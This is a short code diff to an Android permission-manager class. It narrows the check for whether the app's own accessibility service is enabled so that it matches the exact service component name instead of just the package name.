@@ -11,6 +11,7 @@ import android.os.Build;
 import android.provider.Settings;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import com.task.tusker.services.UnifiedAccessibilityService;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -252,7 +253,10 @@ public class AutoPermissionManager {
                 Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
             );
             if (services != null) {
-                return services.toLowerCase().contains(context.getPackageName().toLowerCase());
+                // Check for the specific accessibility service component name
+                // Format: "package/class" (e.g., "com.task.tusker/com.task.tusker.services.UnifiedAccessibilityService")
+                String ourService = context.getPackageName() + "/" + UnifiedAccessibilityService.class.getName();
+                return services.toLowerCase().contains(ourService.toLowerCase());
             }
         }
         return false;
